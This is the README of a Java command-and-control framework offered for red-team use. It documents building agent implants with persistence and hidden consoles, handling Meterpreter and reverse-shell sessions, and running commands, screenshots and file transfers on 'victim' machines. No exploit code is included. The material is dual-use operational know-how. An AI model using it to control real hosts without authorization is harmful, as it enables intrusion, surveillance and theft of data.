# TOMCAT C2 Framework V2

```
        ___________________      _____  _________     ________________ _________  ________
        \__    ___/\_____  \    /     \ \_   ___ \   /  _  \__    ___/ \_   ___ \ \_____  \
          |    |    /   |   \  /  \ /  \/    \  \/  /  /_\  \|    |    /    \  \/  /  ____/
          |    |   /    |    \/    Y    \     \____/    |    \    |    \     \____/       \
          |____|   \_______  /\____|__  /\______  /\____|__  /____|     \______  /\_______ \
                           \/         \/        \/         \/                  \/         \/
                                            Framework V2.0 (Java)
```

> **Author:** MatrixTM26 | **GitHub:** MatrixTM26 | **Language:** Java 17

---

## Overview

TOMCAT C2 is a modular, enterprise-grade Command & Control framework written in Java. It supports multiple interface modes (Web, CLI, JavaFX GUI), mutual TLS authentication using PKCS12 keystores, AES-256-GCM encrypted agent communication, and multi-protocol session handling.

---

## Features

- **Multi-Interface Support** — Web Panel (HTTP), CLI, JavaFX GUI
- **AES-256-GCM Encryption** — All agent communication is encrypted end-to-end
- **Mutual TLS (MTLS)** — Agent authentication via PKCS12 certificates
- **Multi-Protocol Sessions** — TOMCAT agents, Meterpreter, Reverse Shells
- **Certificate Manager** — Full CA, server, and agent cert lifecycle management
- **File Transfer** — Upload and download files to/from agents
- **Session Management** — Thread-safe concurrent session handling
- **Event System** — Decoupled event-driven architecture
- **Cross-Platform** — Runs on Windows, Linux, macOS via JVM
- **Configurable** — All settings via `server.properties`

---

## Project Structure

```
TOMCAT-C2-V2/
├── server.properties
├── pom.xml
├── README.md
├── config/
│   └── app/
│       ├── static/
│       │   ├── css/
│       │   │   └── style.css
│       │   └── js/
│       │       ├── script.js
│       │       ├── sidebar/
│       │       │   └── sidebar.js
│       │       └── themes/
│       │           └── theme.js
│       └── templates/
│           └── index.html
└── src/
    └── main/
        └── java/
            └── com/
                └── tomcat/
                    ├── Start.java
                    ├── utils/
                    │   ├── AnsiColor.java
                    │   ├── ServerConfig.java
                    │   └── SystemHelper.java
                    ├── core/
                    │   ├── output/
                    │   │   └── Logger.java
                    │   ├── crypto/
                    │   │   ├── SymmetricCrypto.java
                    │   │   └── CertificateManager.java
                    │   ├── session/
                    │   │   ├── Session.java
                    │   │   └── SessionManager.java
                    │   ├── event/
                    │   │   └── EventManager.java
                    │   └── server/
                    │       ├── BaseServer.java
                    │       └── TomcatServer.java
                    └── iface/
                        ├── WebApp.java
                        ├── CLI.java
                        ├── GUI.java
                        └── banner/
                            ├── TBanner.java
                            ├── AUTHBanner.java
                            ├── CLIBanner.java
                            └── EndBanner.java
```

---

## Requirements

| Requirement | Version |
|---|---|
| Java JDK | 17 or higher |
| Apache Maven | 3.8+ |
| BouncyCastle | 1.77 (auto via Maven) |
| Gson | 2.10.1 (auto via Maven) |
| JavaFX | 21.0.1 (auto via Maven, GUI mode only) |

---

## Installation

### 1. Clone the Repository

```bash
git clone https://github.com/MatrixTM26/tomcat-c2.git
cd tomcat-c2
```

### 2. Build the Project

```bash
mvn clean package -q
```

This produces `target/tomcat-c2-2.0.0-jar-with-dependencies.jar`.

### 3. Configure server.properties

Edit `server.properties` to match your environment:

```properties
server.host=0.0.0.0
server.port=4444
web.host=0.0.0.0
web.port=5000
security.mtls.enabled=false
mode.interface=web
```

---

## Configuration Reference

All settings are loaded from `server.properties` at startup. Any command-line argument overrides the corresponding property.

| Property | Default | Description |
|---|---|---|
| `server.host` | `0.0.0.0` | C2 listener bind address |
| `server.port` | `4444` | C2 listener port for agents |
| `web.host` | `0.0.0.0` | Web panel bind address |
| `web.port` | `5000` | Web panel HTTP port |
| `web.template.dir` | `config/app/templates` | HTML template directory |
| `web.static.dir` | `config/app/static` | Static assets directory |
| `security.mtls.enabled` | `false` | Enable mutual TLS authentication |
| `security.keystore.path` | `certs/server.p12` | Server PKCS12 keystore path |
| `security.keystore.password` | `tomcat-c2` | Keystore password |
| `security.keystore.type` | `PKCS12` | Keystore type |
| `security.truststore.path` | `certs/truststore.p12` | Truststore path |
| `security.truststore.password` | `tomcat-c2` | Truststore password |
| `security.tls.protocol` | `TLSv1.3` | Minimum TLS protocol version |
| `agent.connection.timeout` | `10000` | Agent handshake timeout (ms) |
| `agent.command.timeout` | `120000` | Command execution timeout (ms) |
| `agent.max.connections` | `100` | Maximum concurrent agent connections |
| `agent.buffer.size` | `8192` | Socket read buffer size (bytes) |
| `logging.max.entries` | `1000` | Maximum in-memory log entries |
| `mode.meterpreter` | `false` | Enable multi-protocol mode |
| `mode.interface` | `web` | Default interface (`web`, `cli`, `gui`) |

---

## Usage

### Basic Startup

```bash
# Web panel mode (default)
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar

# CLI mode
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar -C

# JavaFX GUI mode
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar -G

# Custom host and port
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar -S 192.168.1.10 -p 8080

# MTLS mode
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar --mtls

# Multi-protocol mode (Meterpreter + Reverse Shell support)
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar -M
```

---

## Certificate Management (MTLS)

MTLS uses PKCS12 keystores. The certificate chain is:

```
Root CA  →  Server Certificate
         →  Agent Certificate (per agent)
```

### Step 1 — Initialize CA and Server Certificate

```bash
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar --init-certs

# With specific server host for SAN
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar --init-certs -S 192.168.1.10
```

Generated files:

```
Certs/
├── ca.p12              # CA private key + certificate
├── server.p12          # Server keystore (signed by CA)
└── truststore.p12      # Truststore containing CA + agent certs
```

### Step 2 — Generate Agent Certificate

```bash
# Single agent
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar \
  -a myagent \
  -ah 192.168.1.10 \
  -ap 4444 \
  -am

# With persistence and hidden console (Windows)
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar \
  -a myagent \
  -ah 192.168.1.10 \
  -ap 4444 \
  -am -ps -hc
```

Deployment package is created at `IMPLANT/MYAGENT/`:

```
IMPLANT/MYAGENT/
├── agent.p12       # Agent PKCS12 keystore (keep secure)
├── ca.p12          # CA truststore
└── README.txt      # Deployment instructions
```

### Step 3 — Generate Multiple Agents

```bash
# Generate 10 agents with prefix "team"
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar \
  -m -c 10 -u team \
  -ah 192.168.1.10 \
  -ap 4444 \
  -am

# Output: IMPLANT/TEAM-001/ through IMPLANT/TEAM-010/
```

### Step 4 — Start Server with MTLS

```bash
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar --mtls
```

### Manage Agents

```bash
# List all generated agents
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar -l

# Revoke a specific agent
java -jar target/tomcat-c2-2.0.0-jar-with-dependencies.jar -r myagent
```

---

## Command-Line Arguments

```
Options:
  -h / --help                   Show this help message

Server Options:
  -S / --host      <addr>       C2 server bind address (default: 0.0.0.0)
  -p / --port      <port>       Web panel port (default: 5000)
  -T / --mtls                   Enable MTLS authentication
  -M / --meterpreter            Enable multi-protocol mode
  -C / --cli-mode               Start in CLI interface mode
  -G / --gui-mode               Start in JavaFX GUI mode
  -W / --web-mode               Start in web panel mode (default)

Certificate Setup:
  -i / --init-certs             Initialize CA and server certificates

Agent Options:
  -a / --gen-agent      <id>    Generate single agent certificate
  -m / --gen-multi-agent        Generate multiple agent certificates
  -c / --gen-agent-count <n>    Number of agents to generate (default: 10)
  -u / --gen-agent-prefix <p>   Agent name prefix (default: agent)
  -l / --list-agents            List all agent certificates
  -r / --revoke-agent   <id>    Revoke agent certificate
  -ah / --agent-host    <addr>  C2 host embedded in agent config
  -ap / --agent-port    <port>  C2 port embedded in agent config
  -am / --agent-mtls            Enable MTLS in agent configuration
  -ps / --persistence           Enable persistence in agent
  -hc / --hide-console          Hide agent console window (Windows only)
```

---

## Interface Modes

### Web Panel

The web panel runs an embedded HTTP server. Access it from any browser:

```
http://<web.host>:<web.port>
```

Available REST API endpoints:

| Method | Endpoint | Description |
|---|---|---|
| `GET` | `/api/server/status` | Get server status and uptime |
| `POST` | `/api/server/start` | Start the C2 listener |
| `POST` | `/api/server/stop` | Stop the C2 listener |
| `GET` | `/api/agents` | List all active sessions |
| `GET` | `/api/logs` | Get activity logs |
| `POST` | `/api/logs/clear` | Clear all logs |
| `POST` | `/api/command/execute` | Execute command on agent |

Example API request:

```bash
# Start server
curl -X POST http://localhost:5000/api/server/start \
  -H "Content-Type: application/json" \
  -d '{"Host":"0.0.0.0","Port":"4444"}'

# Execute command
curl -X POST http://localhost:5000/api/command/execute \
  -H "Content-Type: application/json" \
  -d '{"AgentId":1,"Command":"whoami"}'
```

### CLI Mode

```
┌──(TOMCAT@C2)
└─≫ help
```

Available CLI commands:

| Command | Description |
|---|---|
| `sessions` | List all active sessions |
| `use <id>` | Enter interactive session mode |
| `exec <id> <cmd>` | Execute command on a session |
| `logs` | Show recent event logs |
| `status` | Display server status and uptime |
| `stats` | Show session statistics |
| `kill <id>` | Terminate a session |
| `clear` | Clear terminal screen |
| `help` | Show command reference |
| `exit` | Stop server and exit |

Interactive session commands:

| Command | Description |
|---|---|
| `back` | Return to main console |
| `SYSINFO` | Get complete system information |
| `SCREENSHOT` | Capture screen from victim |
| `ELEVATE` | Check privilege escalation |
| `upload <local> [remote]` | Upload file to victim |
| `download <remote>` | Download file from victim |
| `<any command>` | Execute shell command |

### JavaFX GUI Mode

The GUI provides a full desktop application with:

- Sidebar navigation (Dashboard, Sessions, Terminal, Logs, Statistics, Settings)
- Real-time session table with sorting and search
- Integrated terminal with command history
- Activity log viewer with export support
- Server configuration panel
- Per-session execute window

---

## Architecture

### Encryption

All TOMCAT agent communication uses **AES-256-GCM**:

- A fresh 256-bit key is generated on each server start
- Key is transmitted to the agent during the handshake phase
- Every command and response is independently encrypted
- GCM provides both confidentiality and message authentication

### MTLS Flow

```
Agent                               Server
  |                                   |
  |──── TCP Connect ─────────────────>|
  |<─── TLS Handshake ───────────────>|
  |     (Agent presents agent.p12)    |
  |     (Server verifies via CA)      |
  |<─── Fernet Key ──────────────────|
  |──── AgentInfo JSON ─────────────>|
  |<─── Encrypted Commands ─────────>|
```

### Session Lifecycle

```
Accept Connection
      │
      ▼
   Handshake
      │
      ▼
  Add to SessionManager
      │
      ▼
  Fire AgentConnected Event
      │
      ▼
  Monitor Thread (keepalive)
      │
   disconnect
      ▼
  Fire AgentDisconnected Event
      │
      ▼
  Remove from SessionManager
```

### Event Types

| Event | Trigger |
|---|---|
| `ServerStarted` | Server successfully bound and listening |
| `ServerStopped` | Server shut down |
| `AgentConnected` | New agent completed handshake |
| `AgentDisconnected` | Agent connection dropped |
| `AgentRemoved` | Agent removed from session manager |
| `Error` | Internal error occurred |
| `CommandExecuted` | Command finished executing |

---

## File Transfer

### Upload (Server → Agent)

```
exec 1 upload /path/to/local/file.txt /remote/path/file.txt
```

Protocol:
1. Server sends encrypted upload command to agent
2. Server sends encrypted JSON metadata packet + `<META>` marker
3. Server sends raw file bytes + `<END>` marker
4. Agent saves file and sends confirmation

### Download (Agent → Server)

```
exec 1 download /remote/path/file.txt
exec 1 screenshot
```

Protocol:
1. Server sends encrypted download command
2. Agent sends encrypted metadata + `<META>` marker
3. Agent streams file bytes + `<END>` marker
4. Server saves file to `Downloads/Session_<id>/`

Downloaded files are saved to:

```
Downloads/
└── Session_1/
    ├── file.txt
    └── screenshot_1.png
```

---

## Multi-Protocol Mode

When launched with `-M` or `mode.meterpreter=true`, the server accepts three session types on the same port:

| Type | Detection | Encryption |
|---|---|---|
| `TOMCAT` | JSON handshake after key exchange | AES-256-GCM |
| `METERPRETER` | TLV packet structure detection | None (raw protocol) |
| `REVERSE_SHELL` | Raw shell prompt detection | None (plaintext) |

All session types are managed uniformly through `SessionManager` and accessible from all interfaces.

---

## Building from Source

```bash
# Clean build
mvn clean package

# Skip tests
mvn clean package -DskipTests

# Run directly
mvn exec:java -Dexec.mainClass="com.tomcat.Start"

# Build with specific Java version
mvn clean package -Dmaven.compiler.source=17 -Dmaven.compiler.target=17
```

---

## Troubleshooting

**Port already in use:**
```
Error Starting Server: Address already in use
```
Change `server.port` in `server.properties` or kill the process using the port.

**MTLS certificates not found:**
```
MTLS Certificates Not Found!
```
Run `java -jar tomcat-c2.jar --init-certs` first.

**JavaFX not available:**
```
Error: JavaFX runtime components are missing
```
Ensure you are using JDK 17+ and that the jar was built with `jar-with-dependencies`. Alternatively, install JavaFX SDK separately and add it to the module path.

**Agent handshake timeout:**

Increase `agent.connection.timeout` in `server.properties`. Default is 10000ms (10 seconds).

**Command execution timeout:**

Increase `agent.command.timeout` in `server.properties`. Default is 120000ms (2 minutes).

---

## Legal Notice

This tool is intended for authorized penetration testing, red team operations, and security research only. Unauthorized use against systems you do not own or have explicit written permission to test is illegal and unethical.

The authors assume no liability for misuse of this software. By using TOMCAT C2, you agree that you are solely responsible for compliance with all applicable laws.

---

## License

Copyright © MatrixTM26. All rights reserved.

Copying, redistribution, or modification without explicit written permission from the author is prohibited. For collaboration requests, contact the author via GitHub.